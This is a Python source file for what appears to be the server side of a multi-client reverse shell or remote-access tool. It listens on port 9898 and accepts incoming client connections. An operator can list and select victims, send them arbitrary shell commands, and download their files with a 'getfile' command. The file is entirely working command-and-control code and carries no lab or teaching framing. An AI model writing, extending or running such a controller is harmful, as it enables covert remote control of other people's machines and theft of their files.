import socket
import threading
import time
import sys
import os
import signal
from queue import Queue

threads_queue = Queue()
JOBS = ['accept_connections', 'talk_to_connections']
NOF_THREADS = 2
AVAILABLE_COMMANDS = [
    "list: prints all online connections",
    "select client_id: selects a client with client_id and allows to send commands",
    "quit: quits current connection with the client you are talking to(to be used when in select mode)",
    "shutdown: shutsdown the server"
]
class Server:
    def __init__(self):
        self.host = ''
        self.port = 9898
        self.socket = None
        self.connections = []
        self.addresses = []
    
    def create(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as e:
            print(f"Connection Error: {e}")
            sys.exit(1)
        return
    
    def bind(self):
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as ex:
            print(f"scoket binfing error: {ex}")
            time.sleep(5)
            self.bind()
    
    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        for conn in self.connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)
    
    def accept_conn(self):
    
        while True:
            try:
                conn, addr = self.socket.accept()
                conn.setblocking(1) # waits on socket.recv and socket.send
                self.connections.append(conn)
                self.addresses.append(addr)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
            print('\nConnection has been established with: {0}'.format(addr))
        return
    
    def list(self):
        print("-----------CLIENTS------------\nCLIENT_ID       ADDR\n")
        for i, conn in enumerate(self.connections):
            try:
                conn.send(str.encode(" "))
                conn.recv(20480)
            except Exception as e:
                if i<len(self.connections):
                    del self.connections[i]
                if i<len(self.addresses):
                    del self.addresses[i]
                continue
            print(f"{i}: {self.addresses[i]}\n")
        return 
    def shutdown(self):
        threads_queue.task_done()
        threads_queue.task_done()
        self.quit_gracefully()
        print("Server shutdown Successful!")
        return
    
    def send_commands(self, client_id, conn):
        print(f"Now you can send commands to {self.addresses[client_id]}!\n")
        conn.send(str.encode(" "))
        pwd = conn.recv(20480)
        pwd = pwd.decode('utf-8')
        print(f"{pwd} ", end="")
        while True:
            cmd_str = input()
            cmd = str.encode(cmd_str)
            if not len(cmd):
                continue
            try:
                conn.send(cmd)
                if 'getfile' in cmd_str:
                    data = conn.recv(20480) 
                    file_path = cmd_str[cmd_str.find('getfile')+len('getfile')+1:]
                    local_file_name = file_path.split(os.path.sep)[-1]
                    with open(local_file_name, 'wb') as f: 
                        while data.decode('UTF-8')!="DONE UPLOADING":
                            f.write(data)
                            data = conn.recv(20480)
                    print(f"File downloaded sucessful with name:{local_file_name}\n")
                    time.sleep(0.5)
                    output = conn.recv(20480)
                    output_str = output.decode('utf-8')
                    print(output_str, end="")          
                else:   
                    output = conn.recv(20480)
                    output_str = output.decode('utf-8')
                    print(output_str, end="")            
                if cmd_str.strip() == 'quit':
                    break
            except Exception as e:
                print("Unable to revcieve or send meesages: %s" %str(e))
                del self.connections[client_id]
                del self.addresses[client_id]
                break
        return
    
            
            
    def start_comm(self):
        print("ENTER 'help' to get list of commands!\n")
        while True:
            command = input("COMM> ")
            split_command = command.strip().split()
            if command.strip() == "list":
                self.list()
            elif len(split_command)>1 and  "select" == split_command[0]:
                client_id = int(split_command[1])
                try:
                    conn = self.connections[client_id]
                except IndexError as ex:
                    print("Not a valid selecion! please enter correct client_id")
                    continue
                self.send_commands(client_id, conn)
            elif command.strip() == "help":
                   for command in AVAILABLE_COMMANDS:
                       print(command)
            elif command.strip() == "shutdown":
                self.shutdown()
            else:
                print("Please enter valid command!")
        
        
def create_workers():
    server = Server()
    server.register_signal_handler()
    lock = threading.Lock() #mutex
    for _ in range(NOF_THREADS):
        t = threading.Thread(target=work, args=(server, lock))
        t.daemon = True
        t.start()
    return


def work(server, lock):
    while True:
        lock.acquire() #mutex
        x = threads_queue.get()
        lock.release()
        if x == "accept_connections":
            server.create()
            server.bind()
            server.accept_conn()
        if x == "talk_to_connections":
            server.start_comm()
        threads_queue.task_done()
    return

def create_jobs():
    for x in JOBS:
        threads_queue.put(x)
    threads_queue.join()
    return

    
if __name__ == "__main__":
    create_workers()
    create_jobs()